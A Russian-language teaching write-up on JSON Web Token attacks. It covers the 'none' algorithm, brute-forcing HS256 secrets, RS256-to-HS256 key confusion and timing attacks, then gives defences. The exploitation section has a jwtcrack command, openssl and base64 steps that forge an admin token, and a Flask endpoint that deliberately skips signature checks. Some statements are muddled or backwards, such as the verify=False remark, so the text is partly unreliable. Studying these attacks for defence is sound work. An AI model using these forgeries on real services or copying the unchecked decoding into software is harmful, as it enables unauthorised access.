# уязвимость/атака

## Описание

JSON Web Token (JWT) - открытый стандарт (RFC 7519), который определяет компактный и автономный способ безопасного передачи информации между сторонами как объект JSON. JWT - представляет из себя формат токенов используемых в обмене. Эта информация может быть проверена и проверена, поскольку она имеет цифровую подпись. JWT могут быть подписаны с использованием секретного (с алгоритмом HMAC) или пары открытого/закрытого ключей с использованием RSA.

JWT - протокол аутентификации Это означает, что это строгий набор инструкций для выдачи и проверки подписанных токенов доступа. В токенах содержатся утверждения, которые используются приложением для ограничения доступа к пользователю.

JWTs бывают двух видов : JSON Web Signature (JWS) и JSON Web Encryption (JWE). JWS подписывают данных JSON, которые состоят из трех частей, в то время как JWEs шифруются данные в формате JSON и состоит из пяти частей:

![сериализ](https://trustfoundry.net/wp-content/uploads/2017/12/jws-vs-jwe.jpg)

JWT состоит из трех частей: заголовок header, полезные данные payload и подпись signature.
Хедер JWT содержит информацию о том, как должна вычисляться JWT подпись. Хедер — это тоже JSON объект, который выглядит следующим образом:


header = { "alg": "HS256", "typ": "JWT"}

Payload — это полезные данные, которые хранятся внутри JWT.

Подпись
'none': NoneAlgorithm(), Подписи нет, передаются только данные header & payload.

Симметричные шифры:  
'HS256':HMACAlgorithm(HMACAlgorithm.SHA256)  
'HS384':HMACAlgorithm(HMACAlgorithm.SHA384)  
'HS512':HMACAlgorithm(HMACAlgorithm.SHA512)

Ассиметричные шифры:  
'RS256':RSAAlgorithm(RSAAlgorithm.SHA256)  
'RS384':RSAAlgorithm(RSAAlgorithm.SHA384)  
'RS512':RSAAlgorithm(RSAAlgorithm.SHA512)  
'ES256':ECAlgorithm(ECAlgorithm.SHA256)  
'ES384':ECAlgorithm(ECAlgorithm.SHA384)  
'ES521':ECAlgorithm(ECAlgorithm.SHA512)  
'ES512':ECAlgorithm(ECAlgorithm.SHA512)  
'PS256':RSAPSSAlgorithm(RSAPSSAlgorithm.SHA256)  
'PS384':RSAPSSAlgorithm(RSAPSSAlgorithm.SHA384)  
'PS512':RSAPSSAlgorithm(RSAPSSAlgorithm.SHA512)  

Но в основном используются следующие связки:

HMAC + SHA256

RSASSA-PKCS1-v1_5 + SHA256

ECDSA + P-256 + SHA256

Валидация токена в общем виде выполняется следующем образом.

![валидация](https://www.javainuse.com/62-3-min.JPG)    
[валидация](https://dzone.com/articles/spring-boot-security-json-web-tokenjwt-hello-world)

Существует много способов использования токенов. И вот основные из них:

1.Чувствительные данные в JWT

У JWT есть два объекта JSON, которые хранят информацию: у JWT есть компоненты заголовка информации об информации о встроенных заголовках и полезных нагрузках. Заголовок не зашифрован. Токен закодирован в base64, который может быть легко декодирован. А с помощью доступной информации о алгоритме вы можете расшифровать полезную нагрузку. Очень важно использовать надежные секреты для шифрования полезная нагрузка перед использованием в JWT.

В Payload могут находиться данные карт и чего либо подобного.

```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "1234567890",
  "name": "John Doe",
  "card":"1234567890",
  "pin":"1111",
  "iat": 1516239022
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),secret
)
```

Само тело токена кодируется base64UrlEncode, который абсолютно небезопасен. Шифруется\расшфровывается первой же ссылкой в гугле.

2.Измените алгоритм на «None»

По большей части уязвимость jwt токенов заключается в использовании типа none (который должен Обязательно присутствовать) для аутентификции и к тому что все токены можно свести к нему.
Злоумышленник изменяет токен и изменяет алгоритм хеширования, чтобы указать с помощью ключевого слова none, что целостность токена уже проверена. Некоторые библиотеки рассматривали токены, подписанные с помощью алгоритма none, как действительный токен с проверенной подписью, поэтому злоумышленник может изменить утверждения токена, и приложение будет доверять tkey.

```
class NoneAlgorithm(Algorithm):

    def prepare_key(self, key):
        if key == '':
            key = None

        if key is not None:
            raise InvalidKeyError('When alg = "none", key value must be None.')

        return key

    def sign(self, msg, key):
        return b''

    def verify(self, msg, key, sig):
        return False
```

3.Взлом ключа HS256
HS256 алгоритм использует секретный ключ для подписи и подтверждения токенов. Если узнать этот ключ, можно будет самостоятельно подписывать токены. Если ключ недостаточно силен, его можно сломать с помощью атаки методом перебора или словаря. Попробовав множество ключей на JWT и проверив, действительна ли подпись, мы можем обнаружить секретный ключ. Это можно сделать в автономном режиме, без каких-либо запросов к серверу, как только мы получим токен.

Инструменты для брута:  
https://github.com/jmaxxz/jwtbrute  
или  
John the Ripper  
или  
https://github.com/brendan-rius/c-jwt-cracker


4.Эксплуатация HS256

Алгоритм RS 256 использует секретный ключ для подписи и проверки каждого сообщения.Алгоритм RS 256 использует закрытый ключ для подписи сообщений. Поскольку открытый ключ вообще не является секретным, мы можем правильно подписывать такие сообщения. Вот как можно их использовать:

  Получить токен, подписанный RSA (есть доступ только к открытому ключу)
  Расшифруйте заголовок и измените алгоритм с RSA «RS256» на HMAC «HS256».
  Восстанавливаем токен с полезной нагрузкой
  Подпишу токен открытым ключом RSA
  https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

5.Локальное хранилище
можно вытащить из работающего браузера всю инфу включая его локальное хранилище, или же вытащить это все из рама. Оттуда уже достать токен и просто напросто использовать его для авторизованного доступа в сеть.


6.Timing Attack
Timing Attack - это атака по побочному каналу, при которой можно скомпрометировать криптосистему, измерив, сколько времени потребуется системе, чтобы ответить на разные входы. Для проверки подписи с использованием криптографии с симметричным ключом сервер обычно вычисляет побайтово действительную подпись и сравнивает ее с предоставленной. Однако, если байт не совпадает, мы прекращаем сравнивать другие байты. Измеряя время ответа сервера можно определять верное количество байт.
Потребовалось бы 256 попыток найти первый байт 256-битной сигнатуры; еще 256 попыток найти второй байт и так далее. Потребуется 8192 попытки найти полную действительную 256-битную подпись. Сила 256-битной подписи будет снижаться до 13 бит.
[отсюда](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)

## Классификация

[Классификация отсюда](https://www.cvedetails.com/vulnerabilities-by-types.php)

Bypass something	-можно обойти процедуру идентификации и сразу авторизоваться в системы, благодаря поддельным токенам.
Gain Information	- возможно нахождение различных данных (к примеру данных карт, пд и тд)
Gain Privileges - получение админских прав
DoS	- Множественные запросы на подтверждение правильности токенов.
XSS - если появилась уязвимость значит сайт подвержен Xss
CSRF - если появилась уязвимость значит сайт подвержен CSRF

Наиболее часто встречаемые CVE:  
https://www.cvedetails.com/product/31809/F21-JWT.html?vendor_id=15434  
https://www.cvedetails.com/cve/CVE-2017-12974/    
https://www.cvedetails.com/cve/CVE-2017-12973/  
https://www.cvedetails.com/cve/CVE-2017-12972/  
https://www.cvedetails.com/cve/CVE-2019-7644/  
https://nvd.nist.gov/vuln/detail/CVE-2019-7644  
https://pivotal.io/security/cve-2018-15801  

## Условия
- ОС: любая
- язык: проблема в json формате токенов, и не сильно касается языка или сервера.
- компоненты: какие компоненты подвержены проблеме. Это могут быть библиотеки, базы данных, фреймворки, брокеры очередей и т.д.
- настройки: использование стандартных настроек приводит к уязвимости, дополнительное меры безопасности частично закроют дырки.


## Детектирование

[Burp suit](https://github.com/mvetsch/JWT4B) есть несколько плагинов.

Код ревью

## Эксплуатация

Структура токена:

HEADER:ALGORITHM & TOKEN TYPE
```
{
  "typ": "JWT",
  "alg": "HS256"
}
PAYLOAD:DATA

{
  "username": "user",
  "is_admin": true
}
{
  "username": "user",
  "is_admin": true
}
```  


Токен никогда не будет проходить процедуры проверки.

```
@app.route("/index_1", methods=['GET'])
def index_1():
	session = request.cookies.get('session')
	isLoggedIn = False

	if session is not None:
		try:
			result = jwt.decode(session, key=jwt_secret, verify=False)
			isLoggedIn = True

		except Exception as err:
			result = str(err)

	else:
		result = ''

	return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
```

result = jwt.decode(session, key=jwt_secret, verify=False) замена False на true приводит к тому что токен будет всегда приниматься.  

Взлом HS256 тупо брутом.  
```
$ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc qwertyuiopasdfghjklzxcvbnm
Secret is "secret"
```

Подмена ассиметричного шифрования RS на симметричное HS
```
	b64_public = base64.standard_b64encode(public).decode()
  ```
Так как сервер выдает публичный ключ, то мы можем его использовать для того чтобы обмануть механизм шифрования. Так как в методах не захардкожено, необходимое шифрование, мы может заставить сервер шифровать и расшифровывать сигнатуру токена с использованием симметричного шифрования по публичному ключу.
```
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDIfXNTOUNW9t6gH0OURcsbYu9f
AQIkL9fUxsIckicd67DIOyotPquMo5Ak0MJWjlirWkZnBZIyDoLkzr9a28KMhxzM
5aGvuuj5DyPBeQeJJz1Duimtw/OcbY9sUtNhQNrq2Ww2EMrjuTQXyG2Yaf6uNmlW
LB+v4AZ99OepLO+DpQIDAQAB
-----END PUBLIC KEY-----
```
Переведу его значение в hex и изменив данные в поле header (меняется шифрования с асимметрии на симметрию поле alg) и payload (добавлю в токен права админа потому что почему бы и нет) и подпишу этим публичным ключом вновь собраннуй json.
```
 "тело токена" | openssl dgst -sha256 -mac HMAC -macopt hexkey:ключвхексе
```
После чего верну получившиеся значение подписи в формат сигнатуры base64UrlEncode
```
 base64.urlsafe_b64encode(binascii.a2b_hex('db3a1b760eec81e029704691f6780c4d1653d5d91688c24e59891e97342ee59f')).replace('=','')
```
В итоге получаем токен админа, прошедший проверку ассиметричной подписи.
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.IFQI6Zh9Gja_d48CKHo80SZonepddPiemcz_l8WyfFI
```

https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/

### Инструменты
[PyJWT library](https://github.com/jpadilla/pyjwt)  
Burp suit


## Ущерб
Если токены используются для контроля серверов, то велика вероятность или слива или удаления всей базы данных.  
Получение прав на изменение данных на серверах и сайтах.  
Токены также используются для входа в различные сервисы по типу асаны, кибаны, почты что приведет к потере всей бизнес информации.  
Использование токенов в любом виде что физических, что электронных позволяет пользователям избавляться от процедур идентификации и аутентификации, и сразу переходить к получению авторизованного доступа. Злоумышленник получив такой доступ будет обладать всеми правами сотрудника, самое  опасное запуск скриптов и зловредов внутри защитного периметра.


## Защита
### Основные меры

Для кода в задании убрать верификаию 	для этого кода

```
result = jwt.decode(session, key=jwt_secret, verify=False)
```

[Branca](https://branca.io) - IETF XChaCha20-Poly1305 AEAD symmetric encryption,the enrypted token is base62 encoded which makes it.   
Структура токена:
```
"URL safe Version (1B) || Timestamp (4B) || Nonce (24B) || Ciphertext (*B) || Tag (16B)"  
```

Macaroons - токены от google

### Превентивные меры
Используйте сильные ключи и секреты для шифрования.  
Просмотрите библиотеки, которые вы выбираете.  
Убедитесь, что вы проверите подпись.  
Убедитесь, что ваши токены истекают.  
Использовать другое шифрование.  
Не храните данные в локальных хранилищах (и сессиях).  
Проверьте сайт на CSRF XSS.  
https://datatracker.ietf.org/doc/draft-ietf-oauth-jwt-bcp/?include_text=1

## Дополнительно
[Elleptic curves vuln](https://auth0.com/blog/critical-vulnerability-in-json-web-encryption/)  
https://connect2id.com/products/nimbus-jose-jwt/examples

[Owasp cheat sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_Cheat_Sheet_for_Java.md)

https://auth0.com/blog/brute-forcing-hs256-is-possible-the-importance-of-using-strong-keys-to-sign-jwts/#What-is-a-JSON-Web-Token-

[Mac vs sig attack](https://snikt.net/blog/2019/05/16/jwt-signature-vs-mac-attacks/)
## Обход защиты
Если существуют варианты обхода защиты, то можно их здесь перечислить.

Если есть возможность, то надо написать в чем заключается защита и каким образом она обходится.
